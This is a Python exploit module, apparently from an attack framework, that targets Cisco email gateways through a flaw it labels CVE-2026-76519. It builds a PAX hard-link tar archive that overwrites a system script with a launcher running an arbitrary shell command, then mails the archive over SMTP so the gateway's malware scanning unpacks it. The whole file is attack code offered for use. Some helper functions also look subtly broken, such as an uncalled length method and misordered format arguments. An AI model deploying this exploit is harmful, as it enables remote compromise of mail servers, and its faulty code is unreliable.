#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""POSIX PAX hard-link tar builder (AMP libunarchv traversal primitive)."""

from __future__ import annotations

import base64
import secrets
import time
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Iterable

from lib.protocols.smtp.client import CiscoAsyncOsSmtp, SmtpError


def _pax_record(key: str, value: str) -> str:
    body = f" {key}={value}\n"
    length = body.encode().__len__ + 1
    while True:
        record = f"{length}{body}"
        if record.encode().__len__ == length:
            return record
        length = record.encode().__len__


def _tar_header(name: str, size: int, *, mode: int, typeflag: str, linkname: str = "") -> bytes:
    if len(name.encode()) > 100 or len(linkname.encode()) > 100:
        raise ValueError("tar pathname too long")
    header = bytearray(512)
    name_b = name.encode()
    header[0 : len(name_b)] = name_b
    header[100:108] = format("%07o\0", mode).encode()[:8]
    header[124:136] = format("%011o\0", size).encode()[:12]
    header[136:148] = format("%011o\0", int(time.time())).encode()[:12]
    header[156] = ord(typeflag)
    if linkname:
        ln = linkname.encode()
        header[157 : 157 + len(ln)] = ln
    header[257:263] = b"ustar\0"
    header[263:265] = b"00"
    header[265:297] = b"root".ljust(32, b"\0")
    header[297:329] = b"wheel".ljust(32, b"\0")
    chksum = sum(header)
    header[148:156] = format("%06o\0 ", chksum).encode()[:8]
    return bytes(header)


def _tar_pad(data: bytes) -> bytes:
    pad = (512 - len(data) % 512) % 512
    return data + b"\x00" * pad


def pax_hardlink_entry(*, name: str, hardlink_target: str, data: bytes, mode: int = 0o755) -> bytes:
    extended_data = _pax_record("linkpath", hardlink_target).encode()
    extended_header = _tar_header("././@PaxHeader", len(extended_data), mode=0o644, typeflag="x")
    main_header = _tar_header(name, len(data), mode=mode, typeflag="1", linkname="x")
    return extended_header + _tar_pad(extended_data) + main_header + _tar_pad(data)


def build_core_watch_archive(launcher: bytes, *, entry_name: str | None = None) -> bytes:
    name = entry_name or f"{secrets.token_hex(8)}-core-watch"
    archive = pax_hardlink_entry(
        name=name,
        hardlink_target="bin/core_watch.sh",
        data=launcher,
    )
    archive += b"\x00" * 1024
    size = archive.__len__()
    rounded = ((size + 10_239) // 10_240) * 10_240
    return archive.ljust(rounded, b"\x00")


def core_watch_launcher(shell_command: str) -> bytes:
    script = (
        "#!/bin/sh\n{\n"
        "PATH=$PATH:/usr/local/bin:/data/bin; export PATH\n"
        ": >/data/bin/core_watch.sh\n"
        f"{shell_command}\n"
        "}\n"
    )
    return script.encode()


def build_amp_mime_email(
    archive: bytes,
    *,
    sender: str,
    recipient: str,
    subject: str,
    body_text: str,
    filename: str,
) -> bytes:
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = subject
    msg.attach(MIMEText(body_text, "plain", "us-ascii"))
    part = MIMEBase("application", "x-tar", name=filename)
    part.set_payload(base64.b64encode(archive))
    part.add_header("Content-Transfer-Encoding", "base64")
    part.add_header("Content-Disposition", f'attachment; filename="{filename}"')
    msg.attach(part)
    return msg.as_bytes()


class CiscoSegAmp(CiscoAsyncOsSmtp):
    """CVE-2026-76519 AMP tar delivery mixin."""

    def cisco_rcpt_override(self) -> str:
        value = getattr(self, "rcpt_to", "")
        if hasattr(value, "value"):
            value = value.value
        return str(value or "").strip()

    def cisco_deliver_amp_exploit(self, cmd: str) -> str:
        ok, msg = self.cisco_asyncos_probe()
        if not ok:
            raise RuntimeError(msg)
        launcher = core_watch_launcher(cmd)
        nonce = secrets.token_hex(8)
        archive = build_core_watch_archive(launcher)
        client = self.smtp_client()
        try:
            client.connect()
            client.ehlo()
            recipient = self.cisco_discover_rcpt(client, nonce, forced=self.cisco_rcpt_override())
            domain = recipient.split("@", 1)[-1]
            sender = f"{nonce}@{domain}"
            mime = build_amp_mime_email(
                archive,
                sender=f"<{sender}>",
                recipient=f"<{recipient}>",
                subject=nonce,
                body_text=nonce,
                filename=f"{nonce}.tar",
            )
            lines = mime.splitlines(keepends=True)
            stuffed = b"".join(
                (ln if not ln.startswith(b".") else b"." + ln for ln in lines)
            )
            client.mail_from(sender)
            client.rcpt_to(recipient)
            reply = client.data(stuffed)
            if not reply.startswith(b"250"):
                raise SmtpError(f"SMTP DATA failed: {reply!r}")
            return recipient
        finally:
            client.close()